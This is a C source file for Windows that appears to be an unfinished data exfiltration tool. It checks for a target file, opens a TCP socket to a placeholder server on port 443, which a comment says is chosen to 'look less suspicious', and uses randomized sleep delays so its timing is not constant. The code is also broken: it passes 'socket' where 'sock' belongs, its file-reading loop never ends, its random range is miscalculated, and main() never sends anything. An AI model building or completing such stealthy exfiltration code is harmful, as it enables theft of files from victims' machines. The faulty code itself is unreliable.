#include <stdio.h>
#include <stdlib.h>

// Library for implementing the sleep() function
#include <windows.h>

// Library for working with Sockets on Windows
#include<winsock2.h>

// Library for implementing the "random" number
#include <time.h>

// TODO: Add Library in Linking Process (-lws2_32)
#pragma comment(lib, "ws2_32.lib") 

// Define the range of the waiting time in miliseconds
#define MIN_TIME 100
#define MAX_TIME 600



void waitRandTime(){

    // Random function with the range defined by MIN_TIME and MAX_TIME 
    // This is not really generating a random number since it could be calculated but for our use case it's enough to not have a constant wait time 
    srand(time(NULL));
    double result = ((rand() % (MIN_TIME - MAX_TIME)) + MIN_TIME)*100;
    // Sleep for the generated amount of time
    Sleep(result);
}


int checkIfFileExists(const char *fileName)
{
    // Initialize file
    FILE *exfilFile;
    if ((exfilFile = fopen(fileName, "r")))
    {
        fclose(exfilFile);
        return 1;
    }
    return 0;
}

int sendData(FILE *exfilFile){

    // TODO: Implement read of File

    WSADATA wsa;
	SOCKET sock;
	struct sockaddr_in server;
	char *message;


	printf("Initialize Win Sock");
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("Failed to initialize: %d",WSAGetLastError());
        // Clean up Build process
        WSACleanup();
		return 1;
	}
	
	printf("Initialised.\n");
	
	
	if((sock = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d" , WSAGetLastError());
        WSACleanup();
		return 1;
	}

	printf("Socket created.\n");

	// Defining Remote Server with Port 443, so it looks less suspicious
	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_family = AF_INET;
	server.sin_port = htons( 443 );

	if (connect(socket , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		puts("connect error");
		return 1;
	}
	
	printf("Connected\n");


	char buffer[11];
	int charCount = 0;

	while(1) {
		int c = fgetc(exfilFile);

	}

	message = "Test Message";

	if( send(socket, message, strlen(message) , 0) < 0)
	{
		printf("Send failed");
		return 1;
	}
	printf("Data sent");

	WSACleanup();

	return 0;
}

void main(){

    if (checkIfFileExists("FILENAME.txt") == 1){
        printf("File exists");
    } else {
        printf("File doesn't exist");
    };


}